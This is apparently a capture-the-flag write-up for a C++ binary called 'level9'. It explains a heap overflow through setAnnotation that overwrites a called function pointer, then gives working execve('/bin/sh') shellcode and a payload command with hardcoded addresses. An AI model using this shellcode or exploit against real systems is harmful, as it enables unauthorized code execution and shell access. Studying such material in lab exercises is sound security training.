* This level9 is a cpp binary 
* the program instantiate two objects from a class N.
* the program expect at least one argument , which get passed to a member function of the second object, along with the object1 
- the member function (setAnnotation) copy argv[1] to the first object.
* then the program calls a member of the second object 

* somehow if we provide enough input in argv[1] , we overwrite the address which get called .
* to solve this challenge i did the following :

// put the shellcode in an environment variable 
export SHELLCODE=$(python -c 'print "\x90"*400 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')

// 108 is how far the address that get executed from the start of the buffer where argv[1] get copied. + dealing with derefrencing + return to shellcode 
./level9 $(python -c 'print "A"*108 + "\x08\x04\xa0\x7c"[::-1] + "\xbf\xff\xf8\x0c"[::-1]')
